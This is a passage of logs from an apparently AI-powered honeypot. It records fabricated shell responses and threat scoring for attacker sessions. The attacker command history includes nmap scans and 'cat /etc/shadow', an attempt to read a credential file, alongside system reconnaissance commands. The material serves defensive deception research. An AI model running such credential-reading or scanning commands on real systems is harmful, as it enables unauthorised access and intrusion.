    "ai_decision": "Linux web-prod-01 5.15.0-generic x86_64 GNU/Linux",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 7
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.85
    },
    "risk_score": 20,
    "threat_level": "LOW"
}
2026-07-20 18:40:07,997 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: uname -a",
    "ai_decision": "Linux web-prod-01 5.15.0-generic x86_64 GNU/Linux",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "System Enumeration",
    "warning": null,
    "error": null
}
2026-07-20 18:40:11,257 - {
    "session_id": "22c8dcad",
    "query": "hostname",
    "response": "web-prod-01",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 21,
        "risk_level": "LOW",
        "final_score": 21,
        "threat_level": "LOW",
        "base_score": 21,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 8,
            "unique_commands": 8,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 59
        },
        "engagement": {
            "session_duration": 1246,
            "commands_executed": 8,
            "successful_commands": 8,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 54,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 59,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 21,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname"
        ],
        "confidence_score": 0.9
    }
}
2026-07-20 18:40:11,257 - {"session_id": "22c8dcad", "command": "hostname", "attack_type": "Unknown", "risk_score": 21, "threat_level": "LOW"}
2026-07-20 18:40:11,257 - {
    "session_id": "22c8dcad",
    "command": "hostname",
    "ai_decision": "web-prod-01",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 8
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 21,
    "threat_level": "LOW"
}
2026-07-20 18:40:11,258 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: hostname",
    "ai_decision": "web-prod-01",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:40:15,889 - {
    "session_id": "22c8dcad",
    "query": "uptime",
    "response": "14:56:02 up 2 days, 18 min,  1 user,  load average: 0.02, 0.05, 0.05",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 22,
        "risk_level": "LOW",
        "final_score": 22,
        "threat_level": "LOW",
        "base_score": 22,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 9,
            "unique_commands": 9,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 64
        },
        "engagement": {
            "session_duration": 1250,
            "commands_executed": 9,
            "successful_commands": 9,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 58,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 64,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 22,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime"
        ],
        "confidence_score": 0.95
    }
}
2026-07-20 18:40:15,889 - {"session_id": "22c8dcad", "command": "uptime", "attack_type": "Unknown", "risk_score": 22, "threat_level": "LOW"}
2026-07-20 18:40:15,889 - {
    "session_id": "22c8dcad",
    "command": "uptime",
    "ai_decision": "14:56:02 up 2 days, 18 min,  1 user,  load average: 0.02, 0.05, 0.05",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 9
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 22,
    "threat_level": "LOW"
}
2026-07-20 18:40:15,889 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: uptime",
    "ai_decision": "14:56:02 up 2 days, 18 min,  1 user,  load average: 0.02, 0.05, 0.05",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:40:22,659 - {
    "session_id": "22c8dcad",
    "query": "lscpu",
    "response": "Architecture:            x86_64\n  CPU op-mode(s):        32-bit, 64-bit\n  Address sizes:         39 bits physical, 48 bits virtual\n  Byte Order:            Little Endian\nCPU(s):                  2\n  On-line CPU(s) list:   0,1\nVendor ID:               GenuineIntel\n  Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz\n  CPU family:            6\n  Model:                 122\n  Thread(s) per core:    1\n  Core(s) per socket:    2\n  Socket(s):             1",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 23,
        "risk_level": "LOW",
        "final_score": 23,
        "threat_level": "LOW",
        "base_score": 23,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 10,
            "unique_commands": 10,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 69
        },
        "engagement": {
            "session_duration": 1257,
            "commands_executed": 10,
            "successful_commands": 10,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 62,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 69,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 23,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu"
        ],
        "confidence_score": 0.99
    }
}
2026-07-20 18:40:22,660 - {"session_id": "22c8dcad", "command": "lscpu", "attack_type": "Unknown", "risk_score": 23, "threat_level": "LOW"}
2026-07-20 18:40:22,660 - {
    "session_id": "22c8dcad",
    "command": "lscpu",
    "ai_decision": "Architecture:            x86_64\n  CPU op-mode(s):        32-bit, 64-bit\n  Address sizes:         39 bits physical, 48 bits virtual\n  Byte Order:            Little Endian\nCPU(s):                  2\n  On-line CPU(s) list:   0,1\nVendor ID:               GenuineIntel\n  Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz\n  CPU family:            6\n  Model:                 122\n  Thread(s) per core:    1\n  Core(s) per socket:    2\n  Socket(s):             1",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 10
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 23,
    "threat_level": "LOW"
}
2026-07-20 18:40:22,660 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: lscpu",
    "ai_decision": "Architecture:            x86_64\n  CPU op-mode(s):        32-bit, 64-bit\n  Address sizes:         39 bits physical, 48 bits virtual\n  Byte Order:            Little Endian\nCPU(s):                  2\n  On-line CPU(s) list:   0,1\nVendor ID:               GenuineIntel\n  Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz\n  CPU family:            6\n  Model:                 122\n  Thread(s) per core:    1\n  Core(s) per socket:    2\n  Socket(s):             1",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:40:33,337 - {
    "session_id": "22c8dcad",
    "query": "lsb_release -a",
    "response": "Distributor ID: Ubuntu\nDescription:    Ubuntu 22.04.4 LTS\nRelease:        22.04\nCodename:       jammy",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 24,
        "risk_level": "LOW",
        "final_score": 24,
        "threat_level": "LOW",
        "base_score": 24,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 11,
            "unique_commands": 11,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 74
        },
        "engagement": {
            "session_duration": 1267,
            "commands_executed": 11,
            "successful_commands": 11,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 64,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 74,
            "Persistence Score": "LOW",
            "Interaction Depth": "MEDIUM",
            "Risk Score": 24,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a"
        ],
        "confidence_score": 0.99
    }
}
2026-07-20 18:40:33,337 - {"session_id": "22c8dcad", "command": "lsb_release -a", "attack_type": "Unknown", "risk_score": 24, "threat_level": "LOW"}
2026-07-20 18:40:33,337 - {
    "session_id": "22c8dcad",
    "command": "lsb_release -a",
    "ai_decision": "Distributor ID: Ubuntu\nDescription:    Ubuntu 22.04.4 LTS\nRelease:        22.04\nCodename:       jammy",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 11
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 24,
    "threat_level": "LOW"
}
2026-07-20 18:40:33,337 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: lsb_release -a",
    "ai_decision": "Distributor ID: Ubuntu\nDescription:    Ubuntu 22.04.4 LTS\nRelease:        22.04\nCodename:       jammy",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:40:37,847 - {
    "session_id": "22c8dcad",
    "query": "w",
    "response": "14:58:12 up 2 days, 20 min,  1 user,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nubuntu   pts/0    192.168.1.10     14:48    0.00s  0.11s  0.02s w",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 25,
        "risk_level": "MEDIUM",
        "final_score": 25,
        "threat_level": "MEDIUM",
        "base_score": 25,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 12,
            "unique_commands": 12,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 79
        },
        "engagement": {
            "session_duration": 1272,
            "commands_executed": 12,
            "successful_commands": 12,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 66,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 79,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 25,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w"
        ],
        "confidence_score": 0.99
    }
}
2026-07-20 18:40:37,847 - {"session_id": "22c8dcad", "command": "w", "attack_type": "Unknown", "risk_score": 25, "threat_level": "MEDIUM"}
2026-07-20 18:40:37,847 - {
    "session_id": "22c8dcad",
    "command": "w",
    "ai_decision": "14:58:12 up 2 days, 20 min,  1 user,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nubuntu   pts/0    192.168.1.10     14:48    0.00s  0.11s  0.02s w",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 12
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.5
    },
    "risk_score": 25,
    "threat_level": "MEDIUM"
}
2026-07-20 18:40:37,847 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: w",
    "ai_decision": "14:58:12 up 2 days, 20 min,  1 user,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nubuntu   pts/0    192.168.1.10     14:48    0.00s  0.11s  0.02s w",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:40:44,598 - {
    "session_id": "22c8dcad",
    "query": "last -n 5",
    "response": "ubuntu   pts/0        192.168.1.10     Mon Jun 15 14:48   still logged in\nubuntu   pts/0        192.168.1.10     Sun Jun 14 09:15 - 11:22  (02:07)\nreboot   system boot  5.15.0-91-generi Sat Jun 13 14:38   still running\n\nwtmp begins Sat Jun 13 14:38:12 2026",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 26,
        "risk_level": "MEDIUM",
        "final_score": 26,
        "threat_level": "MEDIUM",
        "base_score": 26,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 13,
            "unique_commands": 13,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 84
        },
        "engagement": {
            "session_duration": 1278,
            "commands_executed": 13,
            "successful_commands": 13,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 68,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 84,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 26,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5"
        ],
        "confidence_score": 0.99
    }
}
2026-07-20 18:40:44,598 - {"session_id": "22c8dcad", "command": "last -n 5", "attack_type": "Unknown", "risk_score": 26, "threat_level": "MEDIUM"}
2026-07-20 18:40:44,598 - {
    "session_id": "22c8dcad",
    "command": "last -n 5",
    "ai_decision": "ubuntu   pts/0        192.168.1.10     Mon Jun 15 14:48   still logged in\nubuntu   pts/0        192.168.1.10     Sun Jun 14 09:15 - 11:22  (02:07)\nreboot   system boot  5.15.0-91-generi Sat Jun 13 14:38   still running\n\nwtmp begins Sat Jun 13 14:38:12 2026",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 13
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 26,
    "threat_level": "MEDIUM"
}
2026-07-20 18:40:44,598 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: last -n 5",
    "ai_decision": "ubuntu   pts/0        192.168.1.10     Mon Jun 15 14:48   still logged in\nubuntu   pts/0        192.168.1.10     Sun Jun 14 09:15 - 11:22  (02:07)\nreboot   system boot  5.15.0-91-generi Sat Jun 13 14:38   still running\n\nwtmp begins Sat Jun 13 14:38:12 2026",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 18:41:10,288 - {
    "session_id": "22c8dcad",
    "query": "env",
    "response": "SHELL=/bin/bash\nUSER=ubuntu\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPWD=/home/ubuntu\nLANG=en_US.UTF-8\nHOME=/home/ubuntu\nLOGNAME=ubuntu",
    "selected_personality": {
        "name": "Normal Server",
        "hostname": "ubuntu-server",
        "user": "ubuntu",
        "style": "normal",
        "description": "Standard production server",
        "response_style": "standard, professional, clean terminal output"
    },
    "threat_score": {
        "score": 27,
        "risk_level": "MEDIUM",
        "final_score": 27,
        "threat_level": "MEDIUM",
        "base_score": 27,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe1"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 14,
            "unique_commands": 14,
            "directories_visited": 2,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 89
        },
        "engagement": {
            "session_duration": 1305,
            "commands_executed": 14,
            "successful_commands": 14,
            "failed_commands": 0,
            "files_accessed": 1,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 89,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 27,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 10.0.0.1",
            "cat /etc/shadow",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "env"
        ],
        "confidence_score": 0.99
    }
}
2026-07-20 18:41:10,288 - {"session_id": "22c8dcad", "command": "env", "attack_type": "Unknown", "risk_score": 27, "threat_level": "MEDIUM"}
2026-07-20 18:41:10,288 - {
    "session_id": "22c8dcad",
    "command": "env",
    "ai_decision": "SHELL=/bin/bash\nUSER=ubuntu\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPWD=/home/ubuntu\nLANG=en_US.UTF-8\nHOME=/home/ubuntu\nLOGNAME=ubuntu",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "22c8dcad",
        "interaction_count": 14
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 27,
    "threat_level": "MEDIUM"
}
2026-07-20 18:41:10,288 - {
    "session_id": "22c8dcad",
    "conversation_log": "Attacker executed: env",
    "ai_decision": "SHELL=/bin/bash\nUSER=ubuntu\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPWD=/home/ubuntu\nLANG=en_US.UTF-8\nHOME=/home/ubuntu\nLOGNAME=ubuntu",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-21 11:06:24,999 - {
    "session_id": "71dd20b2",
    "query": "nmap -sS -v 192.168.1.1",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 3,
        "risk_level": "LOW",
        "final_score": 3,
        "threat_level": "LOW",
        "base_score": 3,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 1,
            "unique_commands": 1,
            "directories_visited": 1,
            "recon_commands": 1,
            "persistence_attempts": 0,
            "curiosity_score": 12
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 1,
            "successful_commands": 1,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 4,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 12,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 3,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1"
        ],
        "confidence_score": 0.55
    }
}
2026-07-21 11:06:24,999 - {"session_id": "71dd20b2", "command": "nmap -sS -v 192.168.1.1", "attack_type": "Reconnaissance", "risk_score": 3, "threat_level": "LOW"}
2026-07-21 11:06:24,999 - {
    "session_id": "71dd20b2",
    "command": "nmap -sS -v 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 1
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 3,
    "threat_level": "LOW"
}
2026-07-21 11:06:24,999 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: nmap -sS -v 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-21 11:06:28,687 - {
    "session_id": "71dd20b2",
    "query": "nmap -p 80,443 target.org",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 6,
        "risk_level": "LOW",
        "final_score": 6,
        "threat_level": "LOW",
        "base_score": 6,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 2,
            "unique_commands": 2,
            "directories_visited": 1,
            "recon_commands": 2,
            "persistence_attempts": 0,
            "curiosity_score": 22
        },
        "engagement": {
            "session_duration": 4,
            "commands_executed": 2,
            "successful_commands": 2,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 10,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 22,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 6,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org"
        ],
        "confidence_score": 0.6
    }
}
2026-07-21 11:06:28,687 - {"session_id": "71dd20b2", "command": "nmap -p 80,443 target.org", "attack_type": "Reconnaissance", "risk_score": 6, "threat_level": "LOW"}
2026-07-21 11:06:28,687 - {
    "session_id": "71dd20b2",
    "command": "nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 2
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 6,
    "threat_level": "LOW"
}
2026-07-21 11:06:28,687 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-21 11:07:25,102 - {
    "session_id": "71dd20b2",
    "query": "nmap -p 80,443 target.org",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 9,
        "risk_level": "LOW",
        "final_score": 9,
        "threat_level": "LOW",
        "base_score": 9,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 3,
            "unique_commands": 2,
            "directories_visited": 1,
            "recon_commands": 3,
            "persistence_attempts": 0,
            "curiosity_score": 29
        },
        "engagement": {
            "session_duration": 60,
            "commands_executed": 3,
            "successful_commands": 3,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 32,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 29,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 9,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org"
        ],
        "confidence_score": 0.65
    }
}
2026-07-21 11:07:25,102 - {"session_id": "71dd20b2", "command": "nmap -p 80,443 target.org", "attack_type": "Reconnaissance", "risk_score": 9, "threat_level": "LOW"}
2026-07-21 11:07:25,102 - {
    "session_id": "71dd20b2",
    "command": "nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 3
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 9,
    "threat_level": "LOW"
}
2026-07-21 11:07:25,102 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: nmap -p 80,443 target.org",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for target (192.168.1.1)\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-21 11:07:54,596 - {
    "session_id": "71dd20b2",
    "query": "nmap -sS -v 192.168.1.1",
